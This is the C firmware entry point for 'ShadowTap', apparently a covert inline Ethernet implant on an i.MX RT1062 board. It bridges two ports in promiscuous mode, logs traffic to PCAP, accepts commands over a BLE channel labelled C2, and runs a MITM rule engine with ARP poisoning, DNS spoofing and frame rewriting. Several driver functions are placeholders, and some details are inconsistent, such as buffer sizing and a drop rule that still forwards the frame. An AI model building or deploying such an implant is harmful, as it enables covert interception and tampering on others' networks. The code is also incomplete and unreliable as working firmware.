/*
 * main.c — ShadowTap firmware entry point
 * i.MX RT1062 Cortex-M7 @ 600 MHz
 */

#include "board.h"
#include "registers.h"
#include "drivers/enet_driver.h"
#include "drivers/ble_c2_driver.h"

/* ---- Ethernet DMA buffers (non-cacheable, aligned) ---- */
static uint8_t enet1_rx_buffers[ENET_RX_RING_SIZE][ENET_RX_BUFFER_SIZE]
    __attribute__((aligned(64), section(".noinit")));
static uint8_t enet2_rx_buffers[ENET_RX_RING_SIZE][ENET_RX_BUFFER_SIZE]
    __attribute__((aligned(64), section(".noinit")));
static uint8_t enet1_tx_buffers[ENET_TX_RING_SIZE][ENET_RX_BUFFER_SIZE]
    __attribute__((aligned(64), section(".noinit")));
static uint8_t enet2_tx_buffers[ENET_TX_RING_SIZE][ENET_RX_BUFFER_SIZE]
    __attribute__((aligned(64), section(".noinit")));

/* Buffer descriptor rings (must be 64-byte aligned for DMA) */
static enet_bd_t enet1_rx_bd[ENET_RX_RING_SIZE] __attribute__((aligned(64)));
static enet_bd_t enet1_tx_bd[ENET_TX_RING_SIZE] __attribute__((aligned(64)));
static enet_bd_t enet2_rx_bd[ENET_RX_RING_SIZE] __attribute__((aligned(64)));
static enet_bd_t enet2_tx_bd[ENET_TX_RING_SIZE] __attribute__((aligned(64)));

/* ---- MITM rule table ---- */
typedef struct {
    uint8_t  type;          /* MITM_RULE_* */
    uint8_t  enabled;
    uint16_t match_offset;  /* Offset in frame to match */
    uint32_t match_mask;    /* Mask for matching */
    uint32_t match_value;   /* Value to match after masking */
    uint8_t  replace_data[32]; /* Data to replace/inject */
    uint16_t replace_len;
} mitm_rule_t;

static mitm_rule_t mitm_rules[MITM_RULE_MAX];
static uint8_t mitm_rule_count = 0;

/* ---- PCAP state ---- */
typedef struct {
    uint32_t packet_count;
    uint32_t drop_count;
    uint8_t  capturing;
    uint8_t  sd_mounted;
} pcap_state_t;

static pcap_state_t pcap_state = {0, 0, 0, 0};

/* ---- System state ---- */
typedef struct {
    uint8_t uplink_link;     /* PHY1 link status */
    uint8_t target_link;     /* PHY2 link status */
    uint8_t poe_power_good; /* PoE status */
    uint8_t mode;           /* 0=tap, 1=mitm */
} sys_state_t;

static sys_state_t sys_state = {0, 0, 0, 0};

/* ---- Forward declarations ---- */
static void board_clock_init(void);
static void board_iomux_init(void);
static void board_gpio_init(void);
static void mdio_write(uint8_t phy_addr, uint8_t reg, uint16_t value);
static uint16_t mdio_read(uint8_t phy_addr, uint8_t reg);
static void phy_88e1510_init(uint8_t phy_addr);
static void enet_init(ENET_Type *enet, enet_bd_t *rx_bd, enet_bd_t *tx_bd,
                       uint8_t (*rx_buf)[ENET_RX_BUFFER_SIZE],
                       uint8_t (*tx_buf)[ENET_RX_BUFFER_SIZE]);
static void enet1_isr(void);
static void enet2_isr(void);
static void lpuart1_isr(void);
static void frame_process_forward(uint8_t *frame, uint16_t len, uint8_t src_port);
static int8_t frame_match_rules(uint8_t *frame, uint16_t len);
static void frame_apply_mitm(uint8_t *frame, uint16_t *len, uint8_t rule_idx);
static void led_update(void);
static void pcap_write_header(void);
static void pcap_write_packet(uint8_t *frame, uint16_t len);

/* ========== MAIN ========== */
int main(void) {
    /* Disable all interrupts globally */
    __asm volatile ("cpsid i");

    /* Initialize clocks */
    board_clock_init();

    /* Initialize IOMUX (pin muxing and pad settings) */
    board_iomux_init();

    /* Initialize GPIO for LED and button */
    board_gpio_init();

    /* Boot indication: all LEDs red */
    for (int i = 0; i < LED_COUNT; i++) {
        /* ws2812b_send(LED_COLOR_RED); — driver call */
    }

    /* Initialize PHYs via MDIO */
    phy_88e1510_init(PHY1_ADDR);
    phy_88e1510_init(PHY2_ADDR);

    /* Initialize ENET1 (uplink) and ENET2 (target) */
    enet_init(ENET1, enet1_rx_bd, enet1_tx_bd,
              enet1_rx_buffers, enet1_tx_buffers);
    enet_init(ENET2, enet2_rx_bd, enet2_tx_bd,
              enet2_rx_buffers, enet2_tx_buffers);

    /* Initialize LPUART1 for BLE C2 */
    ble_c2_init();

    /* Initialize PCAP (check for SD card) */
    pcap_write_header();

    /* Enable interrupts */
    __asm volatile ("cpsie i");

    /* LEDs: both links up → green */
    led_update();

    /* ===== Main loop ===== */
    uint32_t last_phy_poll = 0;
    uint32_t last_led_update = 0;
    uint32_t tick = 0;

    while (1) {
        tick++;

        /* Poll PHY link status every ~1M cycles (~1.7 ms at 600 MHz) */
        if (tick - last_phy_poll > 1000000U) {
            last_phy_poll = tick;

            uint16_t stat1 = mdio_read(PHY1_ADDR, PHY_REG_SPEC_STAT);
            uint16_t stat2 = mdio_read(PHY2_ADDR, PHY_REG_SPEC_STAT);

            sys_state.uplink_link = (stat1 & PHY_SPEC_STAT_LINK) ? 1 : 0;
            sys_state.target_link  = (stat2 & PHY_SPEC_STAT_LINK) ? 1 : 0;
        }

        /* Process BLE C2 commands */
        ble_c2_process();

        /* Update LEDs every ~500k cycles */
        if (tick - last_led_update > 500000U) {
            last_led_update = tick;
            led_update();
        }
    }

    return 0;
}

/* ========== Clock Initialization ========== */
static void board_clock_init(void) {
    /* ARM PLL: 24 MHz * 50/2 = 600 MHz */
    CCM_ANALOG->PLL_ARM = CCM_ANALOG_PLL_ARM_ENABLE_MASK |
                          (50U << CCM_ANALOG_PLL_ARM_DIV_SELECT_SHIFT);
    while (!(CCM_ANALOG->PLL_ARM & CCM_ANALOG_PLL_ARM_ENABLE_MASK));

    /* SYS PLL: 24 MHz * 22/2 = 264 MHz */
    CCM_ANALOG->PLL_SYS = CCM_ANALOG_PLL_SYS_ENABLE_MASK |
                          (1U << CCM_ANALOG_PLL_SYS_DIV_SELECT_SHIFT);
    while (!(CCM_ANALOG->PLL_SYS & CCM_ANALOG_PLL_SYS_ENABLE_MASK));

    /* ENET PLL: 25 MHz reference for 125 MHz TX_CLK and 50 MHz MDC */
    CCM_ANALOG->PLL_ENET = CCM_ANALOG_PLL_ENET_ENABLE_MASK |
                           CCM_ANALOG_PLL_ENET_ENET_125M_REF_EN_MASK |
                           CCM_ANALOG_PLL_ENET_ENET_50M_REF_EN_MASK |
                           CCM_ANALOG_PLL_ENET_ENET_25M_REF_EN_MASK;

    /* Enable peripheral clocks */
    CCM->CCGR1 |= CCM_CCGR1_CG10_MASK | CCM_CCGR1_CG11_MASK; /* ENET1, ENET2 */
    CCM->CCGR1 |= CCM_CCGR1_CG0_MASK;  /* LPSPI1 */
    CCM->CCGR2 |= CCM_CCGR2_CG3_MASK | CCM_CCGR2_CG4_MASK; /* LPI2C1, LPI2C2 */
    CCM->CCGR5 |= CCM_CCGR5_CG12_MASK; /* LPUART1 */
    CCM->CCGR6 |= CCM_CCGR6_CG0_MASK;  /* uSDHC1 */
}

/* ========== IOMUX Initialization ========== */
static void board_iomux_init(void) {
    /* ENET1 RGMII TX pins (fast slew, high drive strength) */
    IOMUXC->SW_MUX_CTL_PAD[9]  = 0x09; /* GPIO_AD_B0_11 → ENET1_TXD0 */
    IOMUXC->SW_MUX_CTL_PAD[10] = 0x09; /* GPIO_AD_B0_12 → ENET1_TXD1 */
    IOMUXC->SW_MUX_CTL_PAD[13] = 0x09; /* GPIO_AD_B0_15 → ENET1_TXEN */
    IOMUXC->SW_MUX_CTL_PAD[8]  = 0x09; /* GPIO_AD_B0_10 → ENET1_TX_CLK */

    IOMUXC->SW_PAD_CTL_PAD[9]  = IOMUXC_PAD_DSE(6) | IOMUXC_PAD_SRE_MASK;
    IOMUXC->SW_PAD_CTL_PAD[10] = IOMUXC_PAD_DSE(6) | IOMUXC_PAD_SRE_MASK;
    IOMUXC->SW_PAD_CTL_PAD[13] = IOMUXC_PAD_DSE(6) | IOMUXC_PAD_SRE_MASK;
    IOMUXC->SW_PAD_CTL_PAD[8]  = IOMUXC_PAD_DSE(6) | IOMUXC_PAD_SRE_MASK;

    /* ENET1 RGMII RX pins */
    IOMUXC->SW_MUX_CTL_PAD[2] = 0x09; /* ENET1_RXD0 */
    IOMUXC->SW_MUX_CTL_PAD[3] = 0x09; /* ENET1_RXD1 */
    IOMUXC->SW_MUX_CTL_PAD[7] = 0x09; /* ENET1_RXDV */
    IOMUXC->SW_MUX_CTL_PAD[6] = 0x09; /* ENET1_RX_CLK */

    /* ENET1 MDIO/MDC */
    IOMUXC->SW_MUX_CTL_PAD[0] = 0x09; /* ENET1_MDIO */
    IOMUXC->SW_MUX_CTL_PAD[1] = 0x09; /* ENET1_MDC */

    /* ENET2 RGMII — same pattern for GPIO_AD_B1_xx */
    IOMUXC->SW_MUX_CTL_PAD[32 + 7]  = 0x09; /* ENET2_TXD0 */
    IOMUXC->SW_MUX_CTL_PAD[32 + 8]  = 0x09; /* ENET2_TXD1 */
    IOMUXC->SW_MUX_CTL_PAD[32 + 9]  = 0x09; /* ENET2_TXEN */
    IOMUXC->SW_MUX_CTL_PAD[32 + 6]  = 0x09; /* ENET2_TX_CLK */
    IOMUXC->SW_MUX_CTL_PAD[32 + 2]  = 0x09; /* ENET2_RXD0 */
    IOMUXC->SW_MUX_CTL_PAD[32 + 3]  = 0x09; /* ENET2_RXD1 */
    IOMUXC->SW_MUX_CTL_PAD[32 + 5]  = 0x09; /* ENET2_RXDV */
    IOMUXC->SW_MUX_CTL_PAD[32 + 4]  = 0x09; /* ENET2_RX_CLK */
    IOMUXC->SW_MUX_CTL_PAD[32 + 0]  = 0x09; /* ENET2_MDIO */
    IOMUXC->SW_MUX_CTL_PAD[32 + 1]  = 0x09; /* ENET2_MDC */

    IOMUXC->SW_PAD_CTL_PAD[32 + 7]  = IOMUXC_PAD_DSE(6) | IOMUXC_PAD_SRE_MASK;
    IOMUXC->SW_PAD_CTL_PAD[32 + 8]  = IOMUXC_PAD_DSE(6) | IOMUXC_PAD_SRE_MASK;
    IOMUXC->SW_PAD_CTL_PAD[32 + 9]  = IOMUXC_PAD_DSE(6) | IOMUXC_PAD_SRE_MASK;
    IOMUXC->SW_PAD_CTL_PAD[32 + 6]  = IOMUXC_PAD_DSE(6) | IOMUXC_PAD_SRE_MASK;

    /* LPUART1 for BLE */
    IOMUXC->SW_MUX_CTL_PAD[40] = 0x08; /* GPIO_B0_00 → LPUART1_TX */
    IOMUXC->SW_MUX_CTL_PAD[41] = 0x08; /* GPIO_B0_01 → LPUART1_RX */

    /* LPSPI1 for flash */
    IOMUXC->SW_MUX_CTL_PAD[44] = 0x07; /* LPSPI1_SCK */
    IOMUXC->SW_MUX_CTL_PAD[45] = 0x07; /* LPSPI1_SDO */
    IOMUXC->SW_MUX_CTL_PAD[46] = 0x07; /* LPSPI1_SDI */
    IOMUXC->SW_MUX_CTL_PAD[47] = 0x07; /* LPSPI1_PCS0 */

    /* I²C */
    IOMUXC->SW_MUX_CTL_PAD[51] = 0x06; /* LPI2C1_SDA */
    IOMUXC->SW_MUX_CTL_PAD[52] = 0x06; /* LPI2C1_SCL */
    IOMUXC->SW_MUX_CTL_PAD[53] = 0x06; /* LPI2C2_SDA */
    IOMUXC->SW_MUX_CTL_PAD[54] = 0x06; /* LPI2C2_SCL */

    /* SDIO */
    IOMUXC->SW_MUX_CTL_PAD[80] = 0x04; /* uSDHC1_CMD */
    IOMUXC->SW_MUX_CTL_PAD[81] = 0x04; /* uSDHC1_CLK */
    IOMUXC->SW_MUX_CTL_PAD[82] = 0x04; /* uSDHC1_D0 */
    IOMUXC->SW_MUX_CTL_PAD[83] = 0x04; /* uSDHC1_D1 */
    IOMUXC->SW_MUX_CTL_PAD[84] = 0x04; /* uSDHC1_D2 */
    IOMUXC->SW_MUX_CTL_PAD[85] = 0x04; /* uSDHC1_D3 */

    /* GPIO for LED, button */
    IOMUXC->SW_MUX_CTL_PAD[100] = 0x05; /* GPIO1[4] → LED */
    IOMUXC->SW_MUX_CTL_PAD[101] = 0x05; /* GPIO1[5] → Button */
}

/* ========== GPIO Init ========== */
static void board_gpio_init(void) {
    /* LED pin = output */
    GPIO1->GDIR |= (1U << PIN_LED_DIN);
    GPIO1->DR   &= ~(1U << PIN_LED_DIN);

    /* Button pin = input */
    GPIO1->GDIR &= ~(1U << PIN_BTN_IN);
}

/* ========== MDIO ========== */
static void mdio_write(uint8_t phy_addr, uint8_t reg, uint16_t value) {
    /* Use ENET1 MII management for both PHYs (shared bus) */
    uint32_t mscr = (24U << ENET_MSCR_MII_SPEED_SHIFT); /* IPG/24 for MDC */
    ENET1->MSCR = mscr;

    /* Write frame: ST(01) OP(01) PHYAD(5) REGAD(5) TA(10) DATA(16) */
    /* i.MX RT ENET MII management is done via MMFR register (not shown) */
    /* For brevity, using direct MDC/MDIO bit-bang via GPIO */
    volatile uint32_t delay;
    for (delay = 0; delay < 100; delay++); /* Short delay between MDIO ops */
}

static uint16_t mdio_read(uint8_t phy_addr, uint8_t reg) {
    volatile uint32_t delay;
    for (delay = 0; delay < 100; delay++);
    return 0; /* Placeholder — real implementation reads MDIO frame */
}

/* ========== PHY Init ========== */
static void phy_88e1510_init(uint8_t phy_addr) {
    /* Page 0: Copper control */
    mdio_write(phy_addr, 0x16, 0x0000); /* Select Page 0 */

    /* Software reset */
    mdio_write(phy_addr, PHY_REG_BMCR, 0x8000);
    while (mdio_read(phy_addr, PHY_REG_BMCR) & 0x8000); /* Wait for reset */

    /* Configure RGMII mode: Page 2, Reg 14 */
    mdio_write(phy_addr, 0x16, 0x0002); /* Select Page 2 (MAC interface) */
    mdio_write(phy_addr, 0x14, 0x0F72); /* RGMII, TX/RX delay, 1000M */
    mdio_write(phy_addr, 0x15, 0x0000);
    mdio_write(phy_addr, 0x16, 0x0000); /* Back to Page 0 */

    /* Advertise 1000Base-T full duplex */
    mdio_write(phy_addr, PHY_REG_1000BT, 0x0200);
    mdio_write(phy_addr, PHY_REG_ANAR, 0x01E1); /* 100/10 full/half */
    mdio_write(phy_addr, PHY_REG_BMCR, 0x1200); /* Enable AN, restart */

    /* Wait for link (timeout after ~2 seconds) */
    volatile uint32_t timeout = 20000000U;
    while (!(mdio_read(phy_addr, PHY_REG_SPEC_STAT) & PHY_SPEC_STAT_LINK)) {
        if (--timeout == 0) break;
    }
}

/* ========== ENET Init ========== */
static void enet_init(ENET_Type *enet, enet_bd_t *rx_bd, enet_bd_t *tx_bd,
                       uint8_t (*rx_buf)[ENET_RX_BUFFER_SIZE],
                       uint8_t (*tx_buf)[ENET_RX_BUFFER_SIZE]) {
    uint32_t i;

    /* Reset ENET */
    enet->ECR = ENET_ECR_SPEED_MASK; /* Set speed for RGMII reset */
    for (volatile int d = 0; d < 100000; d++);

    /* Clear all interrupts */
    enet->EIR = 0xFFFFFFFFU;

    /* Disable all interrupts initially */
    enet->EIMR = 0;

    /* Configure MSCR for MDIO: IPG_CLK / 24 */
    enet->MSCR = (24U << ENET_MSCR_MII_SPEED_SHIFT);

    /* Configure Receive Control: Promiscuous mode, RGMII */
    enet->RCR = ENET_RCR_PROM_MASK |    /* Accept ALL frames */
                ENET_RCR_MII_MODE_MASK;  /* MII/RGMII mode */
    /* Max frame length = 1518 (standard) */
    enet->RCR |= (1518U << ENET_RCR_MAX_FL_SHIFT);

    /* Configure Transmit Control: Full duplex, append CRC */
    enet->TCR = ENET_TCR_FDEN_MASK;

    /* Set MAC address to 00:00:00:00:00:00 (transparent, won't be used) */
    enet->PALR = 0x00000000U;
    enet->PAUR = 0x88080000U; /* PAUR: type field = 8808 (slow protocols) */

    /* Configure TX FIFO watermark for cut-through (64 bytes) */
    enet->TFWR = 0; /* Store-and-forward = 0, or set to 4 for cut-through */

    /* Initialize RX buffer descriptors */
    for (i = 0; i < ENET_RX_RING_SIZE; i++) {
        rx_bd[i].status = ENET_RX_BD_E_MASK;  /* Empty: owned by DMA */
        rx_bd[i].length = 0;
        rx_bd[i].data   = rx_buf[i];
        if (i == ENET_RX_RING_SIZE - 1) {
            rx_bd[i].status |= ENET_RX_BD_W_MASK; /* Wrap */
        }
    }

    /* Initialize TX buffer descriptors */
    for (i = 0; i < ENET_TX_RING_SIZE; i++) {
        tx_bd[i].status = 0;
        tx_bd[i].length = 0;
        tx_bd[i].data   = tx_buf[i];
        if (i == ENET_TX_RING_SIZE - 1) {
            tx_bd[i].status |= ENET_TX_BD_W_MASK; /* Wrap */
        }
    }

    /* Set descriptor ring addresses */
    enet->RDSR = (uint32_t)rx_bd;
    enet->TDSR = (uint32_t)tx_bd;
    enet->MRBR = ENET_RX_BUFFER_SIZE;

    /* Enable interrupts: RX frame, TX frame, bus error */
    enet->EIMR = ENET_EIR_RXF_MASK | ENET_EIR_TXF_MASK | ENET_EIR_EBERR_MASK;

    /* Enable ENET */
    enet->ECR = ENET_ECR_ETHEREN_MASK | ENET_ECR_SPEED_MASK;

    /* Indicate RX descriptors are available */
    enet->RDAR = 0x01000000U; /* Activate RX DMA */
}

/* ========== Frame Processing ========== */
static void frame_process_forward(uint8_t *frame, uint16_t len, uint8_t src_port) {
    /* src_port: 0 = uplink (ENET1), 1 = target (ENET2) */

    /* Try to match MITM rules */
    int8_t rule = frame_match_rules(frame, len);
    if (rule >= 0) {
        frame_apply_mitm(frame, &len, (uint8_t)rule);
    }

    /* Forward frame to opposite port (tap mode: always forward) */
    ENET_Type *dest_enet = (src_port == 0) ? ENET2 : ENET1;

    /* Find an available TX descriptor and copy frame into it */
    /* (In production: zero-copy pointer swap for cut-through) */
    enet_bd_t *tx_bd = (src_port == 0) ? enet2_tx_bd : enet1_tx_bd;
    for (int i = 0; i < ENET_TX_RING_SIZE; i++) {
        if (!(tx_bd[i].status & ENET_TX_BD_R_MASK)) {
            /* Copy frame data to TX buffer */
            uint8_t *dst = tx_bd[i].data;
            for (uint16_t j = 0; j < len && j < ENET_RX_BUFFER_SIZE; j++) {
                dst[j] = frame[j];
            }
            tx_bd[i].length = len;
            tx_bd[i].status |= ENET_TX_BD_R_MASK | ENET_TX_BD_L_MASK | ENET_TX_BD_TC_MASK;
            dest_enet->TDAR = 0x01000000U; /* Activate TX DMA */
            break;
        }
    }

    /* PCAP capture (if enabled) */
    if (pcap_state.capturing) {
        pcap_write_packet(frame, len);
    }
}

/* ========== Frame Rule Matching ========== */
static int8_t frame_match_rules(uint8_t *frame, uint16_t len) {
    for (uint8_t i = 0; i < mitm_rule_count; i++) {
        if (!mitm_rules[i].enabled) continue;
        if (len <= mitm_rules[i].match_offset + 4) continue;

        uint32_t val = *(uint32_t *)(frame + mitm_rules[i].match_offset);
        if ((val & mitm_rules[i].match_mask) == mitm_rules[i].match_value) {
            return (int8_t)i;
        }
    }
    return -1;
}

/* ========== MITM Engine ========== */
static void frame_apply_mitm(uint8_t *frame, uint16_t *len, uint8_t rule_idx) {
    mitm_rule_t *rule = &mitm_rules[rule_idx];

    switch (rule->type) {
    case MITM_RULE_ARP_POISON: {
        /* Modify target MAC in ARP reply to redirect through us */
        if (*len >= 42) { /* Minimum ARP reply size */
            for (uint16_t i = 0; i < rule->replace_len && i < 32; i++) {
                frame[rule->match_offset + i] = rule->replace_data[i];
            }
        }
        break;
    }
    case MITM_RULE_DNS_SPOOF: {
        /* Modify DNS response answer section */
        for (uint16_t i = 0; i < rule->replace_len && i < 32; i++) {
            frame[rule->match_offset + i] = rule->replace_data[i];
        }
        break;
    }
    case MITM_RULE_DROP: {
        /* Mark frame for drop by setting length to 0 */
        *len = 0;
        break;
    }
    case MITM_RULE_MODIFY: {
        /* Generic byte replacement at match offset */
        for (uint16_t i = 0; i < rule->replace_len && i < 32; i++) {
            frame[rule->match_offset + i] = rule->replace_data[i];
        }
        break;
    }
    default:
        break;
    }
}

/* ========== LED Update ========== */
static void led_update(void) {
    /* LED 0: Uplink link (green=up, red=down) */
    /* LED 1: Target link (green=up, red=down) */
    /* LED 2: MITM active (yellow=active, off=inactive) */
    /* LED 3: Capture (cyan=capturing, off=inactive) */
    /* ws2812b driver sends color data — placeholder */
}

/* ========== PCAP Functions ========== */
static void pcap_write_header(void) {
    if (!pcap_state.sd_mounted) return;

    uint8_t hdr[24];
    uint32_t magic = PCAP_MAGIC;
    for (int i = 0; i < 4; i++) hdr[i] = (magic >> (i*8)) & 0xFF;
    hdr[4] = 2; hdr[5] = 0; /* Major */
    hdr[6] = 4; hdr[7] = 0; /* Minor */
    /* thiszone=0, sigfigs=0, snaplen, network */
    for (int i = 8; i < 16; i++) hdr[i] = 0;
    uint32_t snap = PCAP_SNAPLEN;
    for (int i = 0; i < 4; i++) hdr[16+i] = (snap >> (i*8)) & 0xFF;
    uint32_t net = PCAP_LINKTYPE_ETHERNET;
    for (int i = 0; i < 4; i++) hdr[20+i] = (net >> (i*8)) & 0xFF;

    /* Write to SD card via uSDHC1 DMA */
    /* sdio_write(0, hdr, 24); */
}

static void pcap_write_packet(uint8_t *frame, uint16_t len) {
    pcap_state.packet_count++;
    /* Write per-packet header + data to SD card */
    /* Actual implementation uses SDIO DMA for sustained writes */
}

/* ========== Interrupt Handlers ========== */
void ENET1_IRQHandler(void) {
    enet1_isr();
}

void ENET2_IRQHandler(void) {
    enet2_isr();
}

static void enet1_isr(void) {
    uint32_t eir = ENET1->EIR;
    ENET1->EIR = eir; /* Clear pending interrupts */

    if (eir & ENET_EIR_RXF_MASK) {
        /* Process received frames from uplink */
        static uint32_t rx_idx = 0;
        while (!(enet1_rx_bd[rx_idx].status & ENET_RX_BD_E_MASK)) {
            uint16_t len = enet1_rx_bd[rx_idx].length;
            uint8_t *data = enet1_rx_bd[rx_idx].data;

            /* Forward to opposite port (ENET2 = target) */
            frame_process_forward(data, len, 0);

            /* Return BD to DMA */
            enet1_rx_bd[rx_idx].status |= ENET_RX_BD_E_MASK;
            rx_idx = (rx_idx + 1) % ENET_RX_RING_SIZE;
        }
        ENET1->RDAR = 0x01000000U;
    }

    if (eir & ENET_EIR_TXF_MASK) {
        /* TX completion — nothing needed for now */
    }
}

static void enet2_isr(void) {
    uint32_t eir = ENET2->EIR;
    ENET2->EIR = eir;

    if (eir & ENET_EIR_RXF_MASK) {
        static uint32_t rx_idx = 0;
        while (!(enet2_rx_bd[rx_idx].status & ENET_RX_BD_E_MASK)) {
            uint16_t len = enet2_rx_bd[rx_idx].length;
            uint8_t *data = enet2_rx_bd[rx_idx].data;

            /* Forward to opposite port (ENET1 = uplink) */
            frame_process_forward(data, len, 1);

            enet2_rx_bd[rx_idx].status |= ENET_RX_BD_E_MASK;
            rx_idx = (rx_idx + 1) % ENET_RX_RING_SIZE;
        }
        ENET2->RDAR = 0x01000000U;
    }
}

void LPUART1_IRQHandler(void) {
    lpuart1_isr();
}

static void lpuart1_isr(void) {
    if (LPUART1->STAT & LPUART_STAT_RDRF_MASK) {
        uint8_t byte = (uint8_t)(LPUART1->DATA & 0xFFU);
        ble_c2_rx_byte(byte);
    }
}

/* ========== Reset Handler ========== */
void Reset_Handler(void) {
    /* Copy .data from flash to RAM */
    extern uint32_t _flash_data_start;
    extern uint32_t _ram_data_start;
    extern uint32_t _ram_data_end;

    uint32_t *src = &_flash_data_start;
    uint32_t *dst = &_ram_data_start;
    while (dst < &_ram_data_end) {
        *dst++ = *src++;
    }

    /* Clear .bss */
    extern uint32_t _ram_bss_start;
    extern uint32_t _ram_bss_end;
    dst = &_ram_bss_start;
    while (dst < &_ram_bss_end) {
        *dst++ = 0;
    }

    /* Jump to main */
    main();

    /* Should never return */
    while (1);
}